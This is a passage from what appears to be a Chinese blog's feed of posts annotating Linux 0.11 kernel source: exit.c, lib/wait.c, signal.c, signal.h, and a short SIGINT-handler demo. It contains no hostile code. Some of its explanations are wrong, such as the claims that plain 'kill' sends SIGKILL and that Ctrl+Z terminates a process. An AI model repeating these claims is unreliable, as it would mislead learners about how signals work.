class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 35</span></span><br><span class="line"><span class="comment">// 参数 sig 是信号值，p 目标任务的结构体指针，priv 控制是否强制发送信号</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">send_sig</span><span class="params">(<span class="keyword">long</span> sig,struct task_struct * p,<span class="keyword">int</span> priv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!p || sig&lt;<span class="number">1</span> || sig&gt;<span class="number">32</span>)<span class="comment">// 判断 p 非空且信号值在 1 ~ 32 之间</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">// 如果强制发送信号，或者当前进程有效用户 ID 与目标进程相同，或者是超级用户</span></span><br><span class="line"><span class="keyword">if</span> (priv || (current-&gt;euid==p-&gt;euid) || suser())</span><br><span class="line">p-&gt;signal |= (<span class="number">1</span>&lt;&lt;(sig<span class="number">-1</span>));<span class="comment">// 则向目标任务发送该信号</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 46</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kill_session</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> **<span class="title">p</span> =</span> NR_TASKS + task;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (--p &gt; &amp;FIRST_TASK) &#123;<span class="comment">// 从任务数组最后一个任务往前遍历</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; (*p)-&gt;session == current-&gt;session)<span class="comment">// 如果该数组项非空且属于当前任务会话组</span></span><br><span class="line">(*p)-&gt;signal |= <span class="number">1</span>&lt;&lt;(SIGHUP<span class="number">-1</span>);<span class="comment">// 则向其发送 SIGHUP 挂断信号</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 83</span></span><br><span class="line"><span class="comment">// 参数 pid 是父进程的 pid</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tell_father</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid)</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;NR_TASKS;i++) &#123;<span class="comment">// 遍历数组</span></span><br><span class="line"><span class="keyword">if</span> (!task[i])<span class="comment">// 跳过空项</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (task[i]-&gt;pid != pid)<span class="comment">// 跳过 pid 不相等的项，直到找到父进程</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">task[i]-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>));<span class="comment">// 向其发送 SIGCHLD 信号</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">&quot;BAD BAD - no father found\n\r&quot;</span>);<span class="comment">// 来到这里就是没找到对应进程</span></span><br><span class="line">release(current);<span class="comment">// 则释放当前进程占用的内存</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 19</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release</span><span class="params">(struct task_struct * p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)<span class="comment">// 任务结构体指针需为非空</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span> ; i&lt;NR_TASKS ; i++)<span class="comment">// 从 1 号进程的任务结构体开始遍历任务数组</span></span><br><span class="line"><span class="keyword">if</span> (task[i]==p) &#123;<span class="comment">// 如果该项就是要释放的任务</span></span><br><span class="line">task[i]=<span class="literal">NULL</span>;<span class="comment">// 则将任务结构体数组中该项置空（释放）</span></span><br><span class="line">free_page((<span class="keyword">long</span>)p);<span class="comment">// 释放任务占用的内存页面</span></span><br><span class="line">schedule();<span class="comment">// 调用调度函数</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">panic(<span class="string">&quot;trying to release non-existent task&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exit.c 中还剩下两个函数，sys_kill 是系统调用 kill 的处理函数，用于<strong>向给定的 pid 对应的进程发送一个信号</strong>；sys_waitpid 是系统调用 waitpid 的处理函数，作用是挂起当前进程直到 pid 指定的子程序终止等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 60</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_kill</span><span class="params">(<span class="keyword">int</span> pid,<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> **<span class="title">p</span> =</span> NR_TASKS + task;<span class="comment">// 从任务数组最后一项开始遍历</span></span><br><span class="line"><span class="keyword">int</span> err, retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pid) <span class="keyword">while</span> (--p &gt; &amp;FIRST_TASK) &#123;<span class="comment">// 如果 pid 为 0</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; (*p)-&gt;pgrp == current-&gt;pid) <span class="comment">// 向当前进程组中所有进程发送信号</span></span><br><span class="line"><span class="keyword">if</span> (err=send_sig(sig,*p,<span class="number">1</span>))</span><br><span class="line">retval = err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid&gt;<span class="number">0</span>) <span class="keyword">while</span> (--p &gt; &amp;FIRST_TASK) &#123;<span class="comment">// 如果 pid &gt; 0</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; (*p)-&gt;pid == pid)<span class="comment">// 只将信号发送给进程号是 pid 的进程</span></span><br><span class="line"><span class="keyword">if</span> (err=send_sig(sig,*p,<span class="number">0</span>))</span><br><span class="line">retval = err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">-1</span>) <span class="keyword">while</span> (--p &gt; &amp;FIRST_TASK)<span class="comment">// 如果 pid 为 -1</span></span><br><span class="line"><span class="keyword">if</span> (err = send_sig(sig,*p,<span class="number">0</span>))<span class="comment">// 将信号发送给除了初始进程之外的所有进程</span></span><br><span class="line">retval = err;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">while</span> (--p &gt; &amp;FIRST_TASK)<span class="comment">// 如果 pid &lt; -1</span></span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; (*p)-&gt;pgrp == -pid)<span class="comment">// 将信号发送给进程组 -pid 的所有进程</span></span><br><span class="line"><span class="keyword">if</span> (err = send_sig(sig,*p,<span class="number">0</span>))</span><br><span class="line">retval = err;</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 142</span></span><br><span class="line"><span class="comment">// 参数 pid 是进程号，stat_addr 是保存状态信息位置的指针，options 是选项</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">unsigned</span> <span class="keyword">long</span> * stat_addr, <span class="keyword">int</span> options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag, code;<span class="comment">// flag 标志用于表示选出的子进程处于 睡眠/就绪 态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">verify_area(stat_addr,<span class="number">4</span>);<span class="comment">// 验证用于存放状态信息的位置内存空间足够</span></span><br><span class="line">repeat:</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;<span class="comment">// 从任务数组最后一项开始遍历</span></span><br><span class="line"><span class="keyword">if</span> (!*p || *p == current)<span class="comment">// 如果该项为空或该项就是当前进程，则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;father != current-&gt;pid)<span class="comment">// 如果该项的父进程不是当前任务，则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>) &#123;<span class="comment">// 如果参数 pid &gt; 0</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pid != pid)<span class="comment">// 如果是当前进程的其他子进程，则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid) &#123;<span class="comment">// 如果参数 pid 为 0，表示等待与当前进程组号相同的任何子进程</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != current-&gt;pgrp)<span class="comment">// 如果当前项和当前进程不在同一进程组，则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>) &#123;<span class="comment">// 如果参数 pid &lt; -1，表示等待进程组号为 -pid 的任何子进程</span></span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != -pid)<span class="comment">// 如果当前项不在 -pid 的进程组，则跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果参数 pid 为 -1，会直接来到这里，表示当前进程等待其任意子进程</span></span><br><span class="line"><span class="keyword">switch</span> ((*p)-&gt;state) &#123;<span class="comment">// 判断选出来的子进程状态</span></span><br><span class="line"><span class="keyword">case</span> TASK_STOPPED:<span class="comment">// 如果是停止状态</span></span><br><span class="line"><span class="keyword">if</span> (!(options &amp; WUNTRACED))<span class="comment">// 且参数 options 中 WUNTRACED 置位</span></span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">// WUNTRACED 表示返回终止子进程信息和因信号停止的子进程信息</span></span><br><span class="line">put_fs_long(<span class="number">0x7f</span>,stat_addr);<span class="comment">// 则将退出时的状态 0x7f 放到 stat_addr 处</span></span><br><span class="line"><span class="keyword">return</span> (*p)-&gt;pid;<span class="comment">// 返回子进程 pid</span></span><br><span class="line"><span class="keyword">case</span> TASK_ZOMBIE:<span class="comment">// 如果是僵死状态</span></span><br><span class="line"><span class="comment">// 将其在内核态与用户态运行的时间分别加在当前进程(父进程)对应字段中</span></span><br><span class="line">current-&gt;cutime += (*p)-&gt;utime;</span><br><span class="line">current-&gt;cstime += (*p)-&gt;stime;</span><br><span class="line">flag = (*p)-&gt;pid;<span class="comment">// 子进程 pid 保存在 flag 中</span></span><br><span class="line">code = (*p)-&gt;exit_code;<span class="comment">// 子进程退出码保存在 code 中</span></span><br><span class="line">release(*p);<span class="comment">// 释放子进程</span></span><br><span class="line">put_fs_long(code,stat_addr);<span class="comment">// 退出码放到 stat_addr 处</span></span><br><span class="line"><span class="keyword">return</span> flag;<span class="comment">// 返回子进程 pid</span></span><br><span class="line"><span class="keyword">default</span>:<span class="comment">// 来到这里表示满足条件的子进程处于运行或睡眠态</span></span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;<span class="comment">// 如果满足条件的子进程处于运行或睡眠态</span></span><br><span class="line"><span class="keyword">if</span> (options &amp; WNOHANG)<span class="comment">// 如果参数 options 中 WNOHANG 置位，直接返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// WNOHANG 表示若没有子进程处于退出或终止态就返回</span></span><br><span class="line">current-&gt;state=TASK_INTERRUPTIBLE;<span class="comment">// 否则将当前进程的状态置为可中断睡眠态</span></span><br><span class="line">schedule();<span class="comment">// 调用进程调度函数</span></span><br><span class="line"><span class="comment">// 当系统又执行本进程时，若本进程没有收到除 SIGCHLD 外的信号，则返回到开头重复处理</span></span><br><span class="line"><span class="keyword">if</span> (!(current-&gt;signal &amp;= ~(<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>))))</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// 否则返回 -EINTR </span></span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果 flag 为 0，表示子进程不存在，返回</span></span><br><span class="line"><span class="keyword">return</span> -ECHILD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们平常在程序中调用的 wait 函数定义在 lib/wait.c 中，wait 实际就是通过调用 sys_waitpid 实现的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// lib/wait.c</span></span><br><span class="line">_syscall3(<span class="keyword">pid_t</span>,waitpid,<span class="keyword">pid_t</span>,pid,<span class="keyword">int</span> *,wait_stat,<span class="keyword">int</span>,options)<span class="comment">// 对应 sys_waitpid</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> * wait_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> waitpid(<span class="number">-1</span>,wait_stat,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-kernel（三）</title>
      <link href="/2020/04/11/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2020/04/11/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>今天我们来看 kernel 目录下的 signal.c，在开始贴代码之前，先聊聊 Linux 中的信号机制</p><h2 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>信号是 Linux 系统中最为古老的进程间通信机制。就如同日常生活中人与人之间通过互联网手段来联络沟通一样，有时需要让进程知道一些事件发生了，这样进程就能通过发生的事件类型做出相应的反应，信号就是进程间联络沟通的桥梁</p><h3 id="信号发生的来源"><a href="#信号发生的来源" class="headerlink" title="信号发生的来源"></a>信号发生的来源</h3><p>上面的概念可能还是很抽象，来看个例子吧。</p><p>假设你在 Linux 终端执行了一个需要运行很久的程序，当你等了很久还是没反应想退出程序时，需要按下 Ctrl+C 来结束，这一按就会产生一个 SIGINT 信号发往当前正在运行的进程。进程收到该信号，就会去信号处理集中找到 SIGINT 对应的处理程序，也就是终止进程的处理程序，进而终止当前进程，返回命令行待输入的状态</p><p>言归正传，信号发生的具体来源：</p><ul><li>硬件来源：刚举的例子就是一种硬件来源，信号由硬件驱动程序产生</li><li>软件来源：系统提供了一些发送信号的 API 函数，如 kill, raise, alarm, setitimer 等，这些信号由内核产生</li></ul><br><h3 id="进程对信号的响应及处理方式"><a href="#进程对信号的响应及处理方式" class="headerlink" title="进程对信号的响应及处理方式"></a>进程对信号的响应及处理方式</h3><p>当进程接收到一个信号时，有三种处理方式：</p><ul><li>忽略：忽略信号，不作处理，但 SIGKILL 与 SIGSTOP 信号无法被忽略（高版本中）</li><li>执行默认操作：每个信号都有默认操作，大部分默认操作是终止进程</li><li>执行自定操作：使用系统提供的函数修改信号处理函数，达到用户自定义响应方式的目的，但 SIGKILL 与 SIGSTOP 信号的处理函数无法被修改（高版本中）</li></ul><br><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>修改信号处理函数的系统 API 是 signal，其原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*signal(<span class="keyword">int</span> _sig, <span class="keyword">void</span> (*_func)(<span class="keyword">int</span>)))(<span class="keyword">int</span>);</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>_sig：信号值</li><li>_func：三种取值：<ul><li>SIG_IGN：忽略信号</li><li>SIG_DFL：系统默认方式</li><li>自定信号处理函数指针</li></ul></li></ul></li><li>返回值：<ul><li>成功返回之前的信号处理函数指针</li><li>失败返回 SIG_ERR</li></ul></li></ul><p>那现在就来写一个程序捕获 SIGINT 信号并实现自己的信号处理函数吧（高版本 Linux）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mySigIntFunc</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You pressed Ctrl+C...but you can&#x27;t stop me!HHHHHHH\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">signal(SIGINT, mySigIntFunc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Pid: %d\n&quot;</span>, getpid());</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行起来：</p><p><img src="../img/s1.png" alt="signal函数"></p><p>现在按 Ctrl+C 就会调用我们自己写的函数 mySigIntFunc 了，因为这个函数没有退出程序的功能，所以 Ctrl+C 不会终止进程。如果想要将其终止掉，方法很多，我列出三种：</p><ul><li>Ctrl + Z ：发送 SIGTSTP 信号终止进程</li><li>Ctrl + \ ：发送 SIGQUIT 信号终止进程</li><li>在另一个终端中键入 <strong>kill 21302</strong>，这里的 21302 是要终止进程的 pid，作用是发送 SIGKILL 信号将其终止（这就是无法修改 SIGKILL 处理方式的原因，需保留一个杀死进程的最终手段）</li></ul><br><h2 id="signal-c"><a href="#signal-c" class="headerlink" title="signal.c"></a>signal.c</h2><h3 id="signal-系统调用"><a href="#signal-系统调用" class="headerlink" title="signal 系统调用"></a>signal 系统调用</h3><p>直观地把握了信号的效果后，再来深入它的实现细节，Linux 0.11 中只实现了 SIGKILL 信号无法被捕获</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 58</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">long</span> handler, <span class="keyword">long</span> restorer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">tmp</span>;</span></span><br><span class="line"><span class="comment">// 判断信号值是否在 1 ~ 32 之间，且 SIGKILL 信号不能被捕获</span></span><br><span class="line"><span class="keyword">if</span> (signum&lt;<span class="number">1</span> || signum&gt;<span class="number">32</span> || signum==SIGKILL)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="comment">// 设置新信号处理方式的 sigaction 结构体</span></span><br><span class="line">tmp.sa_handler = (<span class="keyword">void</span> (*)(<span class="keyword">int</span>)) handler;</span><br><span class="line">tmp.sa_mask = <span class="number">0</span>;</span><br><span class="line">tmp.sa_flags = SA_ONESHOT | SA_NOMASK;</span><br><span class="line">tmp.sa_restorer = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) restorer;</span><br><span class="line"><span class="comment">// 获取当前信号对应的处理函数</span></span><br><span class="line">handler = (<span class="keyword">long</span>) current-&gt;sigaction[signum<span class="number">-1</span>].sa_handler;</span><br><span class="line"><span class="comment">// 将当前信号对应的进程信号处理结构体修改为新结构体</span></span><br><span class="line">current-&gt;sigaction[signum<span class="number">-1</span>] = tmp;</span><br><span class="line"><span class="keyword">return</span> handler;<span class="comment">// 返回之前的处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的三个参数分别为：</p><ul><li>signum：信号值</li><li>handler：信号处理函数指针</li><li>restorer：恢复函数指针，该函数由 libc 库提供，用于在信号处理程序结束后恢复系统调用返回时几个寄存器的原有值以及系统调用的原返回值</li></ul><p>各信号值及 sigaction 结构体定义在 signal.h 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGHUP 1<span class="comment">// 挂断控制终端或进程</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGINT 2<span class="comment">// 键盘中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGQUIT 3<span class="comment">// 键盘退出</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGILL 4<span class="comment">// 非法指令</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGTRAP 5<span class="comment">// 跟踪断点</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGABRT 6<span class="comment">// 异常结束</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGIOT 6<span class="comment">// 异常结束</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGUNUSED 7<span class="comment">// 未使用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGFPE 8<span class="comment">// 协处理器错误</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGKILL 9<span class="comment">// 终止进程</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGUSR110<span class="comment">// 用户信号 1</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGSEGV11<span class="comment">// 无效的内存引用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGUSR212<span class="comment">// 用户信号 2</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGPIPE13<span class="comment">// 管道写出错，读端全关闭</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGALRM14<span class="comment">// 定时器警报</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGTERM15<span class="comment">// 进程终止</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGSTKFLT16<span class="comment">// 栈出错</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGCHLD17<span class="comment">// 子进程状态改变</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGCONT18<span class="comment">// 恢复进程继续执行</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGSTOP19<span class="comment">// 暂停进程执行</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGTSTP20<span class="comment">// tty 发出的停止进程信号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGTTIN21<span class="comment">// 后台进程请求输入</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGTTOU22<span class="comment">// 后台进程请求输出</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SA_NOCLDSTOP1<span class="comment">// 当子进程处于停止状态，就不对 SIGCHLD 信号做处理</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SA_NOMASK0x40000000<span class="comment">// 允许在指定信号处理程序中再次收到该信号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SA_ONESHOT0x80000000<span class="comment">// 信号句柄一旦被调用过就恢复默认处理函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIG_DFL((void (*)(int))0)<span class="comment">// 默认处理程序</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 